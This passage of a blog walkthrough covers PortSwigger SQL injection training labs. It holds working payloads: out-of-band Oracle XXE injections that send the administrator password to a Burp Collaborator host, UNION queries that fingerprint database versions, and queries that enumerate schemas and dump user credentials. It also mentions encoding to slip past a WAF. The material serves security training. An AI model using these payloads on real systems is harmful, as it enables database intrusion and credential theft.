+<h3 id="Lab-Blind-SQL-injection-with-out-of-band-interaction"><a href="#Lab-Blind-SQL-injection-with-out-of-band-interaction" class="headerlink" title="Lab: Blind SQL injection with out-of-band interaction"></a>Lab: Blind SQL injection with out-of-band interaction</h3><blockquote>
+<p>​            This lab contains a blind SQL injection vulnerability. The  application uses a tracking cookie for analytics, and performs a SQL  query containing the value of the submitted cookie.        </p>
+<p>​            The SQL query is executed asynchronously and has no effect  on the application’s response. However, you can trigger out-of-band  interactions with an external domain.        </p>
+<p>​            To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.        </p>
+</blockquote>
+<p>这次网站是异步执行sql了，不能从时间上看出区别了，可以用 DNS 外带。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H6B7TghULcLtqs5R<span class="string">&#x27; union select EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">%</span><span class="number">3</span>C<span class="operator">%</span><span class="number">3</span>Fxml<span class="operator">%</span><span class="number">20</span>version<span class="operator">%</span><span class="number">3</span>D<span class="operator">%</span><span class="number">221.0</span><span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">20</span>encoding<span class="operator">%</span><span class="number">3</span>D<span class="operator">%</span><span class="number">22</span>UTF<span class="number">-8</span><span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">3</span>F<span class="operator">%</span><span class="number">3</span>E<span class="operator">%</span><span class="number">3</span>C<span class="operator">!</span>DOCTYPE<span class="operator">%</span><span class="number">20</span>root<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">5</span>B<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">3</span>C<span class="operator">!</span>ENTITY<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">20</span>remote<span class="operator">%</span><span class="number">20</span><span class="keyword">SYSTEM</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">22</span>http<span class="operator">%</span><span class="number">3</span>A<span class="operator">%</span><span class="number">2</span>F<span class="operator">%</span><span class="number">2</span>Fcyej8oek4gwsfbrnhy397kzmmds4gw4l.oastify.com<span class="operator">%</span><span class="number">2</span>F<span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">3</span>E<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>B<span class="operator">%</span><span class="number">5</span>D<span class="operator">%</span><span class="number">3</span>E<span class="string">&#x27;)%2C&#x27;</span><span class="operator">%</span><span class="number">2</span>Fl<span class="string">&#x27;)%20FROM%20dual --</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="Lab-Blind-SQL-injection-with-out-of-band-data-exfiltration"><a href="#Lab-Blind-SQL-injection-with-out-of-band-data-exfiltration" class="headerlink" title="Lab: Blind SQL injection with out-of-band data exfiltration"></a>Lab: Blind SQL injection with out-of-band data exfiltration</h3><blockquote>
+<p>​            This lab contains a blind SQL injection vulnerability. The  application uses a tracking cookie for analytics, and performs a SQL  query containing the value of the submitted cookie.        </p>
+<p>​            The SQL query is executed asynchronously and has no effect  on the application’s response. However, you can trigger out-of-band  interactions with an external domain.        </p>
+<p>​            The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. You need to exploit the blind SQL injection vulnerability to find out the password of the <code>administrator</code> user.        </p>
+<p>​            To solve the lab, log in as the <code>administrator</code> user.        </p>
+</blockquote>
+<p>在上一题的基础上把信息带出来</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">%</span><span class="number">3</span>C<span class="operator">%</span><span class="number">3</span>Fxml<span class="operator">%</span><span class="number">20</span>version<span class="operator">%</span><span class="number">3</span>D<span class="operator">%</span><span class="number">221.0</span><span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">20</span>encoding<span class="operator">%</span><span class="number">3</span>D<span class="operator">%</span><span class="number">22</span>UTF<span class="number">-8</span><span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">3</span>F<span class="operator">%</span><span class="number">3</span>E<span class="operator">%</span><span class="number">3</span>C<span class="operator">!</span>DOCTYPE<span class="operator">%</span><span class="number">20</span>root<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">5</span>B<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">3</span>C<span class="operator">!</span>ENTITY<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">20</span>remote<span class="operator">%</span><span class="number">20</span><span class="keyword">SYSTEM</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">22</span>http<span class="operator">%</span><span class="number">3</span>A<span class="operator">%</span><span class="number">2</span>F<span class="operator">%</span><span class="number">2</span>F<span class="string">&#x27;%7C%7C(SELECT password from users where username=&#x27;</span>administrator<span class="string">&#x27;)%7C%7C&#x27;</span>.bl0ivn1jrfjr2aem4xq8ujml9cf43wrl.oastify.com<span class="operator">%</span><span class="number">2</span>F<span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">3</span>E<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>B<span class="operator">%</span><span class="number">5</span>D<span class="operator">%</span><span class="number">3</span>E<span class="string">&#x27;)%2C&#x27;</span><span class="operator">%</span><span class="number">2</span>Fl<span class="string">&#x27;)%20FROM%20dual --</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-SQL-injection-with-filter-bypass-via-XML-encoding"><a href="#Lab-SQL-injection-with-filter-bypass-via-XML-encoding" class="headerlink" title="Lab: SQL injection with filter bypass via XML encoding"></a>Lab: SQL injection with filter bypass via XML encoding</h3><blockquote>
+<p>​            This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the  application’s response, so you can use a UNION attack to retrieve data  from other tables.        </p>
+<p>​            The database contains a <code>users</code> table, which  contains the usernames and passwords of registered users. To solve the  lab, perform a SQL injection attack to retrieve the admin user’s  credentials, then log in to their account.        </p>
+</blockquote>
+<p>HEXHTML 编码绕过 waf 检测，学到了一个新插件，很好用 &#x3D;&gt; <strong>Hackvertor</strong></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202510132134993.png" alt="image-20251013213415771"> </p>
+<h3 id="Lab-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle"><a href="#Lab-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle" class="headerlink" title="Lab: SQL injection attack, querying the database type and version on Oracle"></a>Lab: SQL injection attack, querying the database type and version on Oracle</h3><blockquote>
+<p> This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.</p>
+<p>To solve the lab, display the database version string.</p>
+</blockquote>
+<p>在 Oracle 数据库上，每个 <code>SELECT</code>语句必须指定要选择的表 <code>FROM</code>. 如果你的 <code>UNION SELECT</code>攻击不从表中查询，你仍然需要包括 <code>FROM</code>关键字后跟有效的表名。                 </p>
+<p> Oracle 中有一个内置表，称为 <code>dual</code>你可以用它来实现这个目的。例如： <code>UNION SELECT &#39;abc&#39; FROM dual</code>                </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?category=Pets&#x27;union select null,null from dual --</span><br><span class="line">?category=Pets&#x27;union select banner ,&#x27;she11f&#x27;from v$version --</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><a href="#Lab-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft" class="headerlink" title="Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft"></a>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</h3><blockquote>
+<p>​            This lab contains a SQL injection vulnerability in the  product category filter. You can use a UNION attack to retrieve the  results from an injected query.        </p>
+<p>​            To solve the lab, display the database version string.        </p>
+</blockquote>
+<p>这道题数据库是 mysql 啊，一开始我用 –注释不起作用，才想起来 mysql 用 – 注释的话最后面要跟空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accessories&#x27; UNION SELECT &#x27;1111&#x27;, NULL --%20</span><br></pre></td></tr></table></figure>
+
+<p>或者用 #</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accessories&#x27; UNION SELECT &#x27;1111&#x27;, NULL %23</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accessories&#x27; UNION SELECT @@version, NULL %23</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases"><a href="#Lab-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases" class="headerlink" title="Lab: SQL injection attack, listing the database contents on non-Oracle databases"></a>Lab: SQL injection attack, listing the database contents on non-Oracle databases</h3><blockquote>
+<p>​            This lab contains a SQL injection vulnerability in the  product category filter. The results from the query are returned in the  application’s response so you can use a UNION attack to retrieve data  from other tables.        </p>
+<p>​             The application has a login function, and the database  contains a table that holds usernames and passwords. You need to  determine the name of this table and the columns it contains, then  retrieve the contents of the table to obtain the username and password  of all users.        </p>
+<p>​            To solve the lab, log in as the <code>administrator</code> user.        </p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Pets<span class="string">&#x27;union select  table_name,&#x27;</span><span class="number">1</span><span class="string">&#x27; from information_schema.tables--</span></span><br><span class="line"><span class="string">Pets&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span>  column_name,<span class="string">&#x27;1&#x27;</span> <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span><span class="string">&#x27;users_tsucat&#x27;</span><span class="comment">--</span></span><br><span class="line">Pets<span class="string">&#x27;union select  username_oufcos,password_rxqrhp FROM  users_tsucat--</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-SQL-injection-attack-listing-the-database-contents-on-Oracle"><a href="#Lab-SQL-injection-attack-listing-the-database-contents-on-Oracle" class="headerlink" title="Lab: SQL injection attack, listing the database contents on Oracle"></a>Lab: SQL injection attack, listing the database contents on Oracle</h3><blockquote>
+<p>​            This lab contains a SQL injection vulnerability in the  product category filter. The results from the query are returned in the  application’s response so you can use a UNION attack to retrieve data  from other tables.        </p>
+<p>​            The application has a login function, and the database  contains a table that holds usernames and passwords. You need to  determine the name of this table and the columns it contains, then  retrieve the contents of the table to obtain the username and password  of all users.        </p>
+<p>​            To solve the lab, log in as the <code>administrator</code> user.        </p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Lifestyle<span class="string">&#x27; union select table_name,&#x27;</span>a<span class="string">&#x27; from all_tables--</span></span><br><span class="line"><span class="string">Lifestyle&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> column_name,<span class="string">&#x27;a&#x27;</span> <span class="keyword">from</span> all_tab_columns </span><br><span class="line"><span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;USERS_QLHAMI&#x27;</span><span class="comment">--</span></span><br><span class="line">Lifestyle<span class="string">&#x27; union select USERNAME_DCRTGA,PASSWORD_PUTMYO from USERS_QLHAMI --</span></span><br></pre></td></tr></table></figure>
+
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="http://example.com/2025/10/05/%E9%9D%B6%E5%9C%BA/PortSwigger/SQL%20INJECTION/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=http://example.com/2025/10/05/%E9%9D%B6%E5%9C%BA/PortSwigger/SQL%20INJECTION/&title=PortSwigger SQL INJECTION - sleeper&summary=SQL INJECTIONLab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+​            This lab..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=PortSwigger SQL INJECTION - sleeper&amp;body=http://example.com/2025/10/05/%E9%9D%B6%E5%9C%BA/PortSwigger/SQL%20INJECTION/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=http://example.com/2025/10/05/%E9%9D%B6%E5%9C%BA/PortSwigger/SQL%20INJECTION/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2025/10/14/%E9%9D%B6%E5%9C%BA/PortSwigger/Information%20Disclosure/">PortSwigger Information Disclosure</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/09/08/%E9%9D%B6%E5%9C%BA/PortSwigger/XSS/">PortSwigger XSS</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">she11f</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1">Stellar 1.29.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-INJECTION"><span class="toc-text">SQL INJECTION</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data"><span class="toc-text">Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-SQL-injection-vulnerability-allowing-login-bypass"><span class="toc-text">Lab: SQL injection vulnerability allowing login bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query"><span class="toc-text">Lab: SQL injection UNION attack, determining the number of columns returned by the query</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-SQL-injection-UNION-attack-finding-a-column-containing-text"><span class="toc-text">Lab: SQL injection UNION attack, finding a column containing text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-SQL-injection-UNION-attack-retrieving-data-from-other-tables"><span class="toc-text">Lab: SQL injection UNION attack, retrieving data from other tables</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column"><span class="toc-text">Lab: SQL injection UNION attack, retrieving multiple values in a single column</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Blind-SQL-injection-with-conditional-responses"><span class="toc-text">Lab: Blind SQL injection with conditional responses</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Blind-SQL-injection-with-conditional-errors"><span class="toc-text">Lab: Blind SQL injection with conditional errors</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Visible-error-based-SQL-injection"><span class="toc-text">Lab: Visible error-based SQL injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Blind-SQL-injection-with-time-delays"><span class="toc-text">Lab: Blind SQL injection with time delays</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval"><span class="toc-text">Lab: Blind SQL injection with time delays and information retrieval</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Blind-SQL-injection-with-out-of-band-interaction"><span class="toc-text">Lab: Blind SQL injection with out-of-band interaction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Blind-SQL-injection-with-out-of-band-data-exfiltration"><span class="toc-text">Lab: Blind SQL injection with out-of-band data exfiltration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-SQL-injection-with-filter-bypass-via-XML-encoding"><span class="toc-text">Lab: SQL injection with filter bypass via XML encoding</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle"><span class="toc-text">Lab: SQL injection attack, querying the database type and version on Oracle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><span class="toc-text">Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases"><span class="toc-text">Lab: SQL injection attack, listing the database contents on non-Oracle databases</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-SQL-injection-attack-listing-the-database-contents-on-Oracle"><span class="toc-text">Lab: SQL injection attack, listing the database contents on Oracle</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
+    marked: `https://cdn.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
